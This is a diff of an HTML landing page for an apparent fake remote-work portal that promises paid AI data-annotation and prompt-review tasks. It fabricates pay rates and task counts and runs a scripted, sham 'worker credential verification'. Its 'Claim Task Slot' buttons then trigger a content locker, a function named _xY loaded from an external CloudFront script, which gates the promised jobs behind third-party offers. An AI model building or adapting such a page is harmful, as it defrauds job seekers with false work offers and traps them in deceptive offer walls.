@@ -1,43 +1,292 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Task Portal - Daily Task Dispatch & Digital Evaluation</title>
+    <title>Global Remote Task Portal | AI Data Training & Micro-Tasking</title>
 
-    <!-- Open Graph / Social Media Preview Tags -->
-    <meta property="og:title" content="Remote Task Portal - Daily Task Dispatch">
-    <meta property="og:description" content="Join our global remote task pool to evaluate mobile applications, validate digital data, and earn daily rewards.">
+    <meta property="og:title" content="Global Remote Task Portal | AI Data Training & Micro-Tasking">
+    <meta property="og:description" content="Join thousands of remote evaluators across North America & Europe. Complete data annotation, prompt testing, and content moderation tasks directly from your mobile device.">
     <meta property="og:image" content="https://i.postimg.cc/C51yqCr7/IMG-20260916-090904.png">
     <meta property="og:url" content="https://remotetaskportal.site">
     <meta property="og:type" content="website">
 
-    <!-- Twitter Card Tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Remote Task Portal - Daily Task Dispatch">
-    <meta name="twitter:description" content="Join our global remote task pool to evaluate mobile applications, validate digital data, and earn daily rewards.">
+    <meta name="twitter:title" content="Global Remote Task Portal | AI Data Training & Micro-Tasking">
+    <meta name="twitter:description" content="Join thousands of remote evaluators across North America & Europe. Complete data annotation, prompt testing, and content moderation tasks directly from your mobile device.">
     <meta name="twitter:image" content="https://i.postimg.cc/C51yqCr7/IMG-20260916-090904.png">
 
-    <!-- Tailwind CSS & FontAwesome -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        darkbg: '#070913',
+                        cardbg: '#0e1326',
+                        accent: '#38bdf8',
+                        accentglow: '#0284c7'
+                    }
+                }
+            }
+        }
+    </script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #070913; color: #f8fafc; }
+        .glow-box { box-shadow: 0 0 25px rgba(56, 189, 248, 0.15); }
+        .glow-btn { box-shadow: 0 0 20px rgba(56, 189, 248, 0.4); }
+    </style>
 </head>
-<body class="bg-[#0b091a] text-slate-100 flex items-center justify-center min-h-screen m-0">
-    <div class="bg-[#121829] p-8 rounded-xl shadow-2xl w-full max-w-md text-center border border-slate-800">
-        <div class="mb-4 text-cyan-400 text-3xl">
-            <i class="fa-solid fa-globe"></i>
+<body class="min-h-screen flex flex-col justify-between selection:bg-accent selection:text-darkbg">
+
+    <header class="border-b border-slate-800 bg-darkbg/80 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center glow-box">
+                    <i class="fa-solid fa-network-wired text-white text-lg"></i>
+                </div>
+                <div>
+                    <span class="font-bold text-lg tracking-wide bg-gradient-to-r from-white to-slate-400 bg-clip-text text-transparent">GLOBAL REMOTE TASK PORTAL</span>
+                    <span class="block text-[10px] text-cyan-400 font-medium tracking-widest uppercase">AI Training & Evaluation Network</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4">
+                <div class="hidden sm:flex items-center space-x-2 bg-slate-900/80 border border-slate-800 px-3 py-1.5 rounded-full text-xs text-slate-300">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                    <span id="geo-node">Node: US-East (Secure)</span>
+                </div>
+            </div>
         </div>
-        <h1 class="text-2xl font-bold mb-2 text-slate-100">Remote Task Portal</h1>
-        <p class="text-slate-400 text-sm mb-6">Masukkan email aktif Anda untuk mulai mengakses sesi tugas harian.</p>
-        
-        <form action="dashboard.html" method="GET" class="space-y-4">
-            <input type="email" name="user_email" placeholder="nama@email.com" required 
-                class="w-full px-4 py-3 bg-[#0f172a] border border-slate-700 rounded-lg text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500">
-            <button type="submit" 
-                class="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 text-slate-950 font-bold rounded-lg hover:from-cyan-400 hover:to-blue-500 transition shadow-lg shadow-cyan-500/20">
-                Masuk ke Dasbor
+    </header>
+
+    <main class="flex-grow flex items-center justify-center px-4 py-8">
+
+        <div id="view-landing" class="w-full max-w-4xl text-center space-y-8 animate-fadeIn">
+            <div class="inline-flex items-center space-x-2 bg-cyan-950/60 border border-cyan-800/50 px-4 py-1.5 rounded-full text-cyan-300 text-xs font-semibold">
+                <i class="fa-solid fa-shield-halved"></i>
+                <span>Official Q3 2026 AI Training Cohort Open</span>
+            </div>
+            
+            <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight leading-tight">
+                Scale AI Models. <br><span class="bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">Get Paid for Micro-Tasks.</span>
+            </h1>
+            
+            <p class="text-slate-400 text-base sm:text-lg max-w-2xl mx-auto">
+                Join thousands of remote evaluators across North America & Europe. Complete data annotation, prompt testing, and content moderation tasks directly from your mobile device.
+            </p>
+
+            <div class="flex flex-col sm:flex-row justify-center items-center space-y-3 sm:space-y-0 sm:space-x-4 pt-4">
+                <button onclick="switchView('view-onboarding')" class="w-full sm:w-auto bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold px-8 py-4 rounded-xl glow-btn transition-all transform hover:-translate-y-0.5">
+                    Apply as Remote Evaluator <i class="fa-solid fa-arrow-right ml-2"></i>
+                </button>
+            </div>
+
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 pt-8 max-w-3xl mx-auto border-t border-slate-800/80 text-left">
+                <div class="bg-cardbg/50 border border-slate-800/60 p-4 rounded-xl">
+                    <div class="text-slate-400 text-xs">Active Task Pool</div>
+                    <div class="text-xl font-bold text-cyan-400 mt-1">1,429 Batches</div>
+                </div>
+                <div class="bg-cardbg/50 border border-slate-800/60 p-4 rounded-xl">
+                    <div class="text-slate-400 text-xs">Avg. Hourly Rate</div>
+                    <div class="text-xl font-bold text-emerald-400 mt-1">$18.50 - $24.00</div>
+                </div>
+                <div class="col-span-2 sm:col-span-1 bg-cardbg/50 border border-slate-800/60 p-4 rounded-xl">
+                    <div class="text-slate-400 text-xs">Payout Frequency</div>
+                    <div class="text-xl font-bold text-purple-400 mt-1">Daily / Instant</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="view-onboarding" class="w-full max-w-xl bg-cardbg border border-slate-800 p-6 sm:p-8 rounded-2xl shadow-2xl hidden space-y-6">
+            <div>
+                <span class="text-xs font-semibold text-cyan-400 uppercase tracking-wider">Step 1 of 2</span>
+                <h2 class="text-2xl font-bold mt-1">Configure Worker Profile</h2>
+                <p class="text-slate-400 text-sm mt-1">Select your task preferences to match with high-priority enterprise queues.</p>
+            </div>
+
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Select Primary Region</label>
+                    <select id="user-region" class="w-full bg-darkbg border border-slate-700 rounded-xl px-4 py-3 text-sm text-slate-200 focus:outline-none focus:border-cyan-500">
+                        <option value="US">United States (US-East / US-West)</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="CA">Canada</option>
+                        <option value="OTHER">Global / Other Region</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Preferred Task Category</label>
+                    <select class="w-full bg-darkbg border border-slate-700 rounded-xl px-4 py-3 text-sm text-slate-200 focus:outline-none focus:border-cyan-500">
+                        <option>AI Prompt Safety & Logic Evaluation</option>
+                        <option>Multilingual Data Transcription</option>
+                        <option>UI/UX Layout Annotation</option>
+                        <option>General Micro-Tasking</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-medium text-slate-300 mb-1">Device Environment</label>
+                    <div class="p-3 bg-darkbg border border-slate-700 rounded-xl text-sm text-slate-300 flex items-center justify-between">
+                        <span><i class="fa-solid fa-mobile-screen text-cyan-400 mr-2"></i> Smartphone Terminal Mode</span>
+                        <span class="text-xs bg-emerald-950 text-emerald-400 px-2 py-0.5 rounded border border-emerald-800">Compatible</span>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="startVerificationProcess()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-darkbg font-bold py-3.5 rounded-xl glow-btn transition-all">
+                Submit Profile & Initialize <i class="fa-solid fa-arrow-right ml-2"></i>
             </button>
-        </form>
-    </div>
+        </div>
+
+        <div id="view-loading" class="w-full max-w-md bg-cardbg border border-slate-800 p-8 rounded-2xl shadow-2xl hidden text-center space-y-6">
+            <div class="relative w-20 h-20 mx-auto">
+                <div class="absolute inset-0 rounded-full border-4 border-slate-800"></div>
+                <div class="absolute inset-0 rounded-full border-4 border-cyan-500 border-t-transparent animate-spin"></div>
+                <div class="absolute inset-0 flex items-center justify-center text-cyan-400">
+                    <i class="fa-solid fa-shield-checker text-xl"></i>
+                </div>
+            </div>
+
+            <div>
+                <h3 class="text-xl font-bold">Verifying Worker Credentials</h3>
+                <p id="loading-status-text" class="text-xs text-slate-400 mt-2">Connecting to regional server node...</p>
+            </div>
+
+            <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden border border-slate-800">
+                <div id="loading-bar" class="bg-gradient-to-r from-cyan-500 to-blue-500 h-full w-0 transition-all duration-500"></div>
+            </div>
+        </div>
+
+        <div id="view-dashboard" class="w-full max-w-3xl space-y-6 hidden">
+            <div class="bg-cardbg border border-slate-800 p-6 rounded-2xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+                <div>
+                    <div class="flex items-center space-x-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                        <span class="text-xs text-emerald-400 font-semibold tracking-wide">STATUS: PENDING SECURITY DISPATCH</span>
+                    </div>
+                    <h2 class="text-2xl font-bold mt-1">Task Dispatch Center</h2>
+                </div>
+                <div class="bg-darkbg border border-slate-700 px-4 py-2 rounded-xl text-right">
+                    <span class="text-xs text-slate-400 block">Assigned Tier</span>
+                    <span class="text-sm font-bold text-cyan-400">Tier-1 US Evaluator</span>
+                </div>
+            </div>
+
+            <div class="bg-amber-950/30 border border-amber-600/40 p-4 rounded-xl flex items-start space-x-3 text-amber-200 text-xs sm:text-sm">
+                <i class="fa-solid fa-triangle-exclamation text-amber-400 text-lg mt-0.5"></i>
+                <div>
+                    <span class="font-bold block">Regional Verification Required</span>
+                    Due to automated bot prevention policies for high-paying task queues, a one-time regional identity confirmation must be completed before dispatching tasks to your browser session.
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div class="bg-cardbg border border-slate-800 p-5 rounded-xl space-y-3">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs bg-cyan-950 text-cyan-400 px-2.5 py-1 rounded-md border border-cyan-800/60 font-semibold">AI Prompt Review</span>
+                        <span class="text-emerald-400 font-bold text-sm">$22.00 / hr</span>
+                    </div>
+                    <h4 class="font-semibold text-slate-200">Evaluate LLM Response Accuracy</h4>
+                    <p class="text-xs text-slate-400">Review conversational AI outputs for safety, tone, and logical consistency.</p>
+                    <button onclick="triggerContentLocker()" class="w-full bg-cyan-500 hover:bg-cyan-400 text-darkbg font-bold py-2.5 rounded-lg text-xs transition-all cursor-pointer">
+                        Claim Task Slot <i class="fa-solid fa-lock ml-1"></i>
+                    </button>
+                </div>
+
+                <div class="bg-cardbg border border-slate-800 p-5 rounded-xl space-y-3">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs bg-blue-950 text-blue-400 px-2.5 py-1 rounded-md border border-blue-800/60 font-semibold">Data Annotation</span>
+                        <span class="text-emerald-400 font-bold text-sm">$19.50 / hr</span>
+                    </div>
+                    <h4 class="font-semibold text-slate-200">Image & Bounding Box Tagging</h4>
+                    <p class="text-xs text-slate-400">Classify visual training samples for autonomous navigation models.</p>
+                    <button onclick="triggerContentLocker()" class="w-full bg-cyan-500 hover:bg-cyan-400 text-darkbg font-bold py-2.5 rounded-lg text-xs transition-all cursor-pointer">
+                        Claim Task Slot <i class="fa-solid fa-lock ml-1"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="border-t border-slate-800 py-6 text-center text-xs text-slate-500 space-y-2">
+        <div class="flex justify-center space-x-6">
+            <a href="#" class="hover:text-slate-300">Privacy Policy</a>
+            <a href="#" class="hover:text-slate-300">Terms of Service</a>
+            <a href="#" class="hover:text-slate-300">Compliance & Security</a>
+            <a href="#" class="hover:text-slate-300">Worker Helpdesk</a>
+        </div>
+        <p>&copy; 2026 Global Remote Task Portal. All rights reserved. Operating under international remote labor compliance standards.</p>
+    </footer>
+
+    <script type="text/javascript"> 
+        var NyOSN_kJy_qPXsbc = {"it":4631647,"key":"d9479"}; 
+    </script> 
+    <script src="https://d1chbu4sfo2xhu.cloudfront.net/b10f06d.js"></script>
+
+    <script>
+        function switchView(viewId) {
+            document.getElementById('view-landing').classList.add('hidden');
+            document.getElementById('view-onboarding').classList.add('hidden');
+            document.getElementById('view-loading').classList.add('hidden');
+            document.getElementById('view-dashboard').classList.add('hidden');
+            
+            document.getElementById(viewId).classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function startVerificationProcess() {
+            switchView('view-loading');
+            
+            const statusText = document.getElementById('loading-status-text');
+            const loadingBar = document.getElementById('loading-bar');
+            
+            setTimeout(() => {
+                statusText.innerText = "Verifying regional IP stability (US-East)...";
+                loadingBar.style.width = "40%";
+            }, 1000);
+
+            setTimeout(() => {
+                statusText.innerText = "Checking task queue eligibility...";
+                loadingBar.style.width = "80%";
+            }, 2300);
+
+            setTimeout(() => {
+                statusText.innerText = "Profile successfully authenticated!";
+                loadingBar.style.width = "100%";
+            }, 3500);
+
+            setTimeout(() => {
+                switchView('view-dashboard');
+            }, 4200);
+        }
+
+        function triggerContentLocker() {
+            if (typeof _xY === 'function') {
+                _xY();
+            } else {
+                setTimeout(function() {
+                    if (typeof _xY === 'function') { _xY(); }
+                }, 500);
+            }
+        }
+    </script>
+
+    <script type="text/javascript">
+        var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,5051899,4,0,0,0,00010000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();
+    </script>
+    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5051899&101" alt="" border="0"></a></noscript>
 </body>
 </html>
